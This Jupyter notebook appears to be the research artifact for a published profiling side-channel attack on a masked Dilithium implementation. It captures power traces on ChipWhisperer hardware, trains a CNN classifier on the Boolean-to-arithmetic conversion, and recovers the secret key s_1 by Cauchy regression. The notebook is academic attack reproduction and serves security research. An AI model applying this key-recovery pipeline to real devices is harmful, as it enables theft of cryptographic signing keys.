{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "id": "ffb41f8d",
   "metadata": {},
   "source": [
    "## Profiling Side-Channel Attack on a Masked Dilithium Implementation\n",
    "                                              \n",
    "This notebook contains the proof of concept attack on the masked Dilithium implementation of [1], desribed in [2].\n",
    "The Boolean to arithmetic conversion of masked shares is targeted to gain information about the commitment- or error-vector coefficient y.\n",
    "Using Cauchy regression this information is used to recover the partial secret key s_1.\n",
    "\n",
    "[1] https://github.com/fragerar/Masked_Dilithium  \n",
    "[2] https://eprint.iacr.org/2023/896"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3627e8b0-f8a6-4585-bc16-aeae2a57931c",
   "metadata": {},
   "source": [
    "## 0) Setup\n",
    "- Choose security_level to attack. Notebook should be re-run from top on change of security_level.\n",
    "- Import helper functions and dependencies from attack_includes.py.\n",
    "- (Option A) Compile target firmware for CW308 with STM32F415RGT target and SimpleSerial V1.1 to capture traces.\n",
    "Optimization level 3 (-O3) is used as it is commonly most resilient against SCA in lattice-based schemes [SKL+20].\n",
    "- (Option B) Download profiling- and attack-traces as well as classifiers used for the attack described in the ASIACCrypt paper."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1fb1ff84-365e-4577-9cc0-6c7c3a1d4694",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Choose security level to attack from {2, 3, 5}\n",
    "security_level = 2\n",
    "y_intermediate = {2: 2**17, 3: 2**19, 5:2**19}[security_level]\n",
    "data_path = \"attack/paper_data/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4fe4e147-477a-4c30-92e5-42d1a512e0b7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import includes and helpers\n",
    "%run \"attack/helper.py\"\n",
    "%matplotlib inline"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "236e702a-6b89-423e-929b-74dba9a5492d",
   "metadata": {},
   "source": [
    "##### (Option A) Install Chipwhisperer dependencies and build target firmware"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "34f05e98-794d-48ce-9d8e-27b3661436d1",
   "metadata": {},
   "outputs": [],
   "source": [
    "pip install chipwhisperer==6.0.0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e06711c-0b7a-48af-9f98-05cf06653840",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import capture helpers\n",
    "%run \"attack/capture.py\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ccd8d678-e99c-4d19-a8fa-054f05f9ea69",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "mkdir attack/extern\n",
    "cd attack/extern\n",
    "git clone --depth 1 --branch v6.0.0 https://github.com/newaetech/chipwhisperer.git\n",
    "cd chipwhisperer\n",
    "git submodule update --init firmware/mcu/hal/chipwhisperer-fw-extra"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c302f42b-dca2-4a6f-9f96-36d26bb71f6c",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cd attack/firmware\n",
    "make OPT=3 PLATFORM='CW308_STM32F4' CRYPTO_TARGET='NONE' SS_VER='SS_VER_1_1' > /dev/null"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "97a27599-94c3-4a51-b53d-9cf0ee1758f4",
   "metadata": {},
   "source": [
    "##### (Option B) Download paper attack data for reproduction of results (1GB downlad, 7GB disk space)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9736371f-b5f2-44a5-b380-93a076f3ce0b",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "mkdir attack/paper_data\n",
    "cd attack/paper_data\n",
    "wget --progress=bar:force:noscroll https://zenodo.org/records/17291471/files/attack_data.zip\n",
    "unzip -q attack_data.zip"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c70b9866",
   "metadata": {},
   "source": [
    "## 1) Profiling Stage\n",
    "\n",
    "In the profiling stage power traces are collected on a profiling device A during the Boolean to arithmetic (b2a) conversion of randomly generated boolean share pairs, masking either y<0 coefficients (labeled 0) or y>=0 coefficients (labeled 1). A CNN-based binary classifier is trained to predict whether a trace corresponds to the conversion of shares masking a y<0 or y>=0 coefficient."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8623d673-c7a9-4f44-bca3-6035dad8645e",
   "metadata": {},
   "source": [
    "### 1.1) (Option A) Load pre-captured profiling traces"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "38425cd8-d4e2-4868-b87a-5adf14ca2e2f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load pre-captured profiling traces, captured on profiling device A\n",
    "# The same traces are used for level 3 and 5 due to similar \n",
    "# y_intermediate = 2**19 -> y=0.\n",
    "profiling_idx = {2: 2, 3: 35, 5: 35}[security_level]\n",
    "profiling_traces = np.load(data_path + f\"/profiling/profiling_traces_{profiling_idx}_A.npy\")\n",
    "profiling_labels = np.load(data_path + f\"/profiling/profiling_labels_{profiling_idx}_A.npy\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fef8f03b-f9ad-4571-b244-ce312720238c",
   "metadata": {},
   "source": [
    "### 1.1) (Option B) Collect profiling traces\n",
    "\n",
    "To collect profiling traces using a Chipwhisperer make sure the python dependency is installed (uncommented in requirements_attack.txt) and a recent chipwhisperer framework is cloned into the attack folder (attack/extern/chipwhisperer)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e5d7b10e-df48-48de-960b-a0a2d9fe049d",
   "metadata": {},
   "source": [
    "##### Compile target firmware and program target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0245b95a-5326-4086-9eb3-b3436bb5888d",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Note that in the attack performed as part of the ASIACrypt Paper, \n",
    "# two distinct Chipwhisperer Lite (CW308) devices with two distinct\n",
    "# STM32F415RGT target/victim devices were used for the performed\n",
    "# profiling and attack respectively.\n",
    "profiling_scope = cw.scope()\n",
    "profiling_scope.default_setup()\n",
    "# Flush the hex file to the target device\n",
    "cw.program_target(profiling_scope, cw.programmers.STM32FProgrammer, \"attack/firmware/b2a-CW308_STM32F4.hex\", baud = 115200)\n",
    "profiling_target = cw.target(profiling_scope, cw.targets.SimpleSerial, flush_on_err=False)\n",
    "# On correct programming receive 'OK!' message.\n",
    "profiling_target.read()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2c426287-1a63-4bcf-8210-2ed70cf5e30b",
   "metadata": {},
   "source": [
    "##### Capture profiling traces"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f2967d8-9070-4eeb-bdc7-f0ba4b1c0f56",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Collect training data of executions of b2a conversion in intervall y=0 + [-y_range, +y_range[, \n",
    "# with n_y_coeff traces per y-value with y = 2**17 for level 2 and 2**19 for levels 3 and 5.\n",
    "# Representative subset for y_coeff is used for profiling with 64.000 traces in total.\n",
    "y_range = {2: 16, 3: 32, 5: 32}[security_level]\n",
    "y_n = {2: 2000, 3: 1000, 5: 1000}[security_level]\n",
    "profiling_traces, profiling_labels = capture_profiling_traces(profiling_scope, y_intermediate, y_range, n_y_coeff=y_n)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ed743117-7648-4958-ade3-2e110f7b9392",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Plot TTest, SNR and power traces for the collected traces and groups y<0 and y>=0\n",
    "power_traces_0, power_traces_1, snr, t_univariate = analyse_traces(profiling_traces, profiling_labels)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "67a278c4-fa8a-41cd-b1ac-3b0670aa501b",
   "metadata": {},
   "source": [
    "### 1.2) Train CNN to classify between y<0 and y>=0"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a40407c7-0519-41d4-b4f2-094efaae3706",
   "metadata": {},
   "source": [
    "#### 1.2.1) (Option A) Load pre-trained model and scaler"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5477c156-15d9-47c5-852d-ace26b3750f6",
   "metadata": {},
   "outputs": [],
   "source": [
    "model = tf.keras.models.load_model(f\"{data_path}/profiling/classifier/attack_model_{security_level}.keras\")\n",
    "with open(f\"{data_path}/profiling/classifier/attack_scaler_{security_level}.pickle\", 'rb') as f:\n",
    "    scaler = pickle.load(f)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0014e56e-1b6a-4b77-9d3a-96a57669f2c5",
   "metadata": {},
   "source": [
    "#### 1.2.2) (Option B) Prepare data and train model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b602576b-3c88-4eda-a90c-e04926fb8844",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Seed for reproduceability\n",
    "SEED = 42\n",
    "tf.keras.backend.clear_session()\n",
    "random.seed(SEED)\n",
    "tf.random.set_seed(SEED)\n",
    "tf.config.experimental.enable_op_determinism()\n",
    "\n",
    "# Split profiling traces into training data 70% and\n",
    "# test data 30%.\n",
    "trace_train, trace_validation, label_train, label_validation = train_test_split(\n",
    "profiling_traces, profiling_labels, test_size=0.3, stratify=profiling_labels, random_state=SEED)\n",
    "\n",
    "scaler = StandardScaler()\n",
    "trace_train = scaler.fit_transform(trace_train)\n",
    "trace_validation = scaler.transform(trace_validation)\n",
    "\n",
    "# Since we suspect dependencies between instructions \n",
    "# (4 sample points/instruction cycle) we choose a CNN\n",
    "# with kernel size 8.\n",
    "model = Sequential([\n",
    "    Conv1D(64, kernel_size=8, activation='relu', input_shape=(trace_train.shape[1], 1)),\n",
    "    MaxPooling1D(pool_size=2),\n",
    "    Flatten(),\n",
    "    Dense(1, activation='sigmoid')\n",
    "])\n",
    "\n",
    "# Best performing epochs and weights empirically found\n",
    "# for high validation TPR and low FPR. Depending on balance\n",
    "# more or less samples/signatures are required.\n",
    "# Higher precision will decrease TPR on attack data and\n",
    "# require more signatures for successfull key recovery.\n",
    "epochs = {2: 3, 3: 8, 5: 4}[security_level]\n",
    "# For level 3 and 5 higher z-filter range choices (2: +-50 (max = eta*tau = 78)\n",
    "#, 3: +-100 (max = eta*tau = 196), 5: +-80 (max = eta*tau = 120)),\n",
    "# distinguishing between less distant Hamming weights seems to be harder,\n",
    "# higher positive weigths empirically led to lower FPR and higher TPR.\n",
    "weights = {2: {0: 1, 1: 1}, 3: {0: 1, 1: 40}, 5: {0: 1, 1: 40}}[security_level]\n",
    "# Compile and train model!\n",
    "model.compile(optimizer='adam', loss='binary_crossentropy', metrics=[Precision(), Recall()])\n",
    "model.fit(trace_train, label_train, epochs=epochs, batch_size=128, validation_data=(trace_validation, label_validation), class_weight=weights, shuffle=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "010edc79-0551-439b-9b90-4812e711e135",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Predict and analyse classifier on training validation data for 80% prediction threshold!\n",
    "_ = predict(model, trace_validation, label_validation, threshold=0.8)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a46e195e-a1e0-4ea6-8aae-af488e4569d4",
   "metadata": {},
   "source": [
    "## 2) Attack Stage\n",
    "\n",
    "In the attack stage first, the resource intensive generation of signature data is performed on a server. Next, tarces for the b2a conversion of intermediate boolean share collected during the signature generation are captured. The profiling stage classifier is used to predict whether the traces show the conversion of boolean shares masking a y_i,j coefficient smaller or greater-equal zero. This information is used to recver the partial Dilithium secret key s_1 using Cauchy regression."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d81dd29d-f448-4d80-861d-1d1e5ddcb5b5",
   "metadata": {},
   "source": [
    "### 2.1) (Option A) Load pre-captured attack traces"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "434c7501-71f7-4392-ae37-58d746171db2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load pre-captured attack traces, captured on victim device B\n",
    "# during b2a conversion of generated boolean_share pairs from \n",
    "# attack/attack_data_{security_level}/bs.npy\n",
    "attack_traces = np.load(data_path + f\"/attack/attack_traces_{security_level}_B.npy\")\n",
    "attack_labels = np.load(data_path + f\"/attack/attack_labels_{security_level}_B.npy\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d3fb017c-bc1c-4926-b823-869b3b986da8",
   "metadata": {},
   "source": [
    "### 2.1) (Option B) Generate signature data and capture corresponding attack traces\n",
    "\n",
    "Within a hardcoded, empirically found z-filter range, e.g. signatures polynomials with public coefficients |z_i,j| < {2: 50, 3: 100, 5: 80} ILWE samples (z = y + cs_1, s_1 and y unknow) are collected. The range is defined in data_generator/include/attack/data_generator.hpp as FILTER_Z.\n",
    "\n",
    "The data generator collects and outputs the for masked Dilithium with security level set through the environment variable DILITHIUM_MODE the following files:\n",
    "- bs.npy -- The boolean shares generated to mask the sample's y_i,j coefficient (per sample) -- Shape: (n_samples, n_shares=2)\n",
    "- c.npy -- The public challenge polynomial (per sample, might be similar for multiple samples) -- Shape: (n_samples, N=256})\n",
    "- coeff.npy -- The coefficient index i of the sample -- Shape: (n_samples)\n",
    "- poly.npy -- The polynomial index j of the sample -- Shape: (n_samples)\n",
    "- s1.npy -- The partial Dilithium secret key we want to recover (once) -- Shape: (L={2: 4, 3: 5, 5: 7}, N=256)\n",
    "- y.npy -- The actual y_i,j coefficient values used for evaluation (per sample) -- Shape: (n_samples)\n",
    "- z.npy -- The public polynomial z_i,j coefficient (per sample) -- Shape: (n_samples)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b47835aa-4f38-4f57-bdef-161ba655521c",
   "metadata": {},
   "source": [
    "##### Install dependencies for data generator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e218281-6e6c-4e10-9b30-b15008ce9d35",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cd attack/data_generator\n",
    "mkdir extern\n",
    "cd extern\n",
    "git clone --depth 1 --branch v1.0.1 https://github.com/llohse/libnpy.git\n",
    "git clone https://github.com/fragerar/Masked_Dilithium.git"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ed30ed9a-9a76-4ea1-9397-e197addbad27",
   "metadata": {},
   "source": [
    "##### Build and run data_generator for Dilithium (security_level)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9a2e48d4-e0bf-4cd9-ad27-ac54da667c6e",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash -s \"$security_level\"\n",
    "cd attack/data_generator\n",
    "export DILITHIUM_MODE=$1 && ./build.sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37f5a89f-51e3-490e-911a-ed0175c87f76",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Generate signature atttack data (for 2500 zero coefficients this\n",
    "# takes about 46 mins on 8 threads).\n",
    "# The number of zero coefficient target was estimated from UMTS24.\n",
    "# Successfull attacks were performed for <y_zero_target> coefficients:\n",
    "y_zero_target = {2: 2330, 3: 3200, 5: 4400}[security_level]\n",
    "# This leads to the collection of approximately the following number of ILWE samples:\n",
    "# 2: 227305\n",
    "# 3: 620170\n",
    "# 5: 711100\n",
    "# Path for newly generated data\n",
    "data_path = \"./\"\n",
    "folder_path = f\"attack/attack_data_{security_level}\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f4bdafc-788c-4e74-93d4-c7aca5bd51c1",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash -s \"{y_zero_target}\" \"{folder_path}\"\n",
    "# Usage: data_generator <bool Masked> <unsigned ZeroCoefficientsTarget> \n",
    "#  <string OutPath> (optional: <unsigned NThreads>)\n",
    "./attack/data_generator/build/src/data_generator 1 $1 $2 4"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f91a9f2-092a-43ae-9407-6d1e5919ba2c",
   "metadata": {},
   "source": [
    "#### Capture attack power traces of b2a conversion of generated boolean share pairs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1e4b183-7987-44a1-943d-cf5b7f877f08",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Note that in the attack performed as part of the ASIACrypt Paper, \n",
    "# two distinct Chipwhisperer Lite (CW308) devices with two distinct\n",
    "# STM32F415RGT target/victim devices were used for the performed\n",
    "# profiling and attack respectively.\n",
    "attack_scope = cw.scope()\n",
    "attack_scope.default_setup()\n",
    "# Flush the hex file to the target device\n",
    "cw.program_target(attack_scope, cw.programmers.STM32FProgrammer, \"attack/firmware/b2a-CW308_STM32F4.hex\", baud = 115200)\n",
    "attack_target = cw.target(attack_scope, cw.targets.SimpleSerial, flush_on_err=False)\n",
    "# On correct programming receive 'OK!' message.\n",
    "attack_target.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3fcc09f-eace-4f4e-83d9-f976c07fa513",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load .npy file of real-world generated boolean shares\n",
    "boolean_shares = np.load(f\"{data_path}/attack/attack_data_{security_level}/bs.npy\")\n",
    "# Capture traces of the b2a conversion of the generated boolean shares pairs\n",
    "attack_traces, attack_labels = capture_attack_traces(attack_scope, boolean_shares, y_intermediate)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b51538f0-5f2b-46f3-b14b-be1a3603c3f5",
   "metadata": {},
   "source": [
    "### 2.2) Predict y-coefficients using the classifier and recover secret key s_1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "355737a9-3252-4961-b2dc-b25ff66970d3",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Apply scaling similar to profiling!\n",
    "scaled_attack_traces = scaler.transform(attack_traces)\n",
    "# Predict traces show conversion of intermediates corresponding to y<0 or y>= 0\n",
    "# coefficients with at least 80% predicted probability.\n",
    "prediction = predict(model, scaled_attack_traces, attack_labels, threshold=0.8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee2ded73-350c-4ee5-82f4-c4c920f9881d",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# Paths to pass to command line call...\n",
    "attack_data_path = f\"{data_path}/attack/attack_data_{security_level}/\"\n",
    "prediction_path = f\"{attack_data_path}/prediction.npy\"\n",
    "# Save prediction\n",
    "np.save(prediction_path, prediction)\n",
    "# Compute secret key using Cauchy regression.\n",
    "# Usage: python recover_key.py <generated signature data> <prediction.npy>\n",
    "%run attack/recover_key.py $attack_data_path $prediction_path"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
